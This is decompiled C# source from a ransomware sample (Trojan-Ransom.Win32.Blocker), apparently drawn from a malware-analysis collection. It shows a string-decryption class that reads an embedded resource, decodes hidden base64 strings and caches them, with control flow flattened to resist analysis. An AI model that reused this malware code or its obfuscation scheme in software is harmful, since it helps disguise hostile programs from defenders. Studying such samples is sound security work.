// Decompiled with JetBrains decompiler
// Type: ?20?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

public class \u003F20\u003F
{
  private static readonly string \u003F0\u003F = \u003F94\u003F.\u003F95\u003F("1");
  private static readonly string \u003F5\u003F;
  private static readonly byte[] \u003F0\u003F;
  private static readonly Dictionary<int, string> \u003F0\u003F;
  private static readonly bool \u003F0\u003F;
  private static readonly int \u003F0\u003F;

  public static string \u003F53\u003F(int _param0)
  {
    _param0 -= \u003F20\u003F.\u003F0\u003F;
    int num1 = 0;
    string str1;
    int count;
    int index1;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (\u003F20\u003F.\u003F0\u003F)
          {
            \u003F20\u003F.\u003F0\u003F.TryGetValue(_param0, out str1);
            num1 = 1;
            continue;
          }
          break;
        case 1:
          switch (str1)
          {
            case null:
              break;
            default:
              goto label_5;
          }
          break;
        case 2:
          index1 = _param0;
          num1 = 3;
          continue;
        case 3:
          num2 = (int) \u003F20\u003F.\u003F0\u003F[index1++];
          num1 = 4;
          continue;
        case 4:
          if ((num2 & 128) == 0)
          {
            count = num2;
            num1 = 5;
            continue;
          }
          if ((num2 & 64) == 0)
          {
            count = ((num2 & 63) << 8) + (int) \u003F20\u003F.\u003F0\u003F[index1++];
            num1 = 6;
            continue;
          }
          goto label_15;
        case 5:
          goto label_11;
        default:
          goto label_16;
      }
      count = 0;
      num1 = 2;
    }
label_5:
    return str1;
label_11:
    if (count == 0)
      return string.Empty;
    goto label_16;
label_15:
    int num3 = (num2 & 31) << 24;
    byte[] numArray1 = \u003F20\u003F.\u003F0\u003F;
    int index2 = index1;
    int num4 = index2 + 1;
    int num5 = (int) numArray1[index2] << 16;
    int num6 = num3 + num5;
    byte[] numArray2 = \u003F20\u003F.\u003F0\u003F;
    int index3 = num4;
    int num7 = index3 + 1;
    int num8 = (int) numArray2[index3] << 8;
    int num9 = num6 + num8;
    byte[] numArray3 = \u003F20\u003F.\u003F0\u003F;
    int index4 = num7;
    index1 = index4 + 1;
    int num10 = (int) numArray3[index4];
    count = num9 + num10;
label_16:
    string str2;
    try
    {
      byte[] bytes = Convert.FromBase64String(Encoding.UTF8.GetString(\u003F20\u003F.\u003F0\u003F, index1, count));
      int num11 = 0;
      string str3;
      while (true)
      {
        switch (num11)
        {
          case 0:
            str3 = string.Intern(Encoding.UTF8.GetString(bytes, 0, bytes.Length));
            num11 = 1;
            continue;
          case 1:
            if (\u003F20\u003F.\u003F0\u003F)
            {
              try
              {
                \u003F20\u003F.\u003F0\u003F.Add(_param0, str3);
              }
              catch
              {
              }
            }
            str2 = str3;
            num11 = 2;
            continue;
          default:
            goto label_24;
        }
      }
    }
    catch
    {
      str2 = (string) null;
    }
label_24:
    return str2;
  }

  static \u003F20\u003F()
  {
    int num1 = 0;
    Assembly executingAssembly;
    while (true)
    {
      switch (num1)
      {
        case 0:
          \u003F20\u003F.\u003F5\u003F = \u003F94\u003F.\u003F95\u003F("2Ĵȶ");
          num1 = 1;
          continue;
        case 1:
          \u003F20\u003F.\u003F0\u003F = (byte[]) null;
          num1 = 2;
          continue;
        case 2:
          \u003F20\u003F.\u003F0\u003F = false;
          num1 = 3;
          continue;
        case 3:
          \u003F20\u003F.\u003F0\u003F = 0;
          num1 = 4;
          continue;
        case 4:
          if (\u003F20\u003F.\u003F0\u003F == \u003F94\u003F.\u003F95\u003F("0"))
          {
            \u003F20\u003F.\u003F0\u003F = true;
            num1 = 5;
            continue;
          }
          break;
        case 5:
          \u003F20\u003F.\u003F0\u003F = new Dictionary<int, string>();
          break;
        case 6:
          executingAssembly = Assembly.GetExecutingAssembly();
          num1 = 7;
          continue;
        default:
          goto label_11;
      }
      \u003F20\u003F.\u003F0\u003F = Convert.ToInt32(\u003F20\u003F.\u003F5\u003F);
      num1 = 6;
    }
label_11:
    using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(\u003F94\u003F.\u003F95\u003F("]Ĝȑ͇ЖՃؕܬ\u087Bर\u0A7Fନబപี༣ဦᄥሡጾᐪᕷᘥᝬᠣᤸᩯᬼᱫᵯḸὦ‴ℰ∳⌺\u2434╼")))
    {
      int int32 = Convert.ToInt32(manifestResourceStream.Length);
      int num2 = 0;
      byte[] buffer;
      while (true)
      {
        switch (num2)
        {
          case 0:
            buffer = new byte[int32];
            num2 = 1;
            continue;
          case 1:
            manifestResourceStream.Read(buffer, 0, int32);
            num2 = 2;
            continue;
          case 2:
            \u003F20\u003F.\u003F0\u003F = \u003F24\u003F.\u003F54\u003F(buffer);
            num2 = 3;
            continue;
          case 3:
            buffer = (byte[]) null;
            num2 = 4;
            continue;
          case 4:
            manifestResourceStream.Close();
            num2 = 5;
            continue;
          default:
            goto label_20;
        }
      }
label_20:;
    }
  }
}
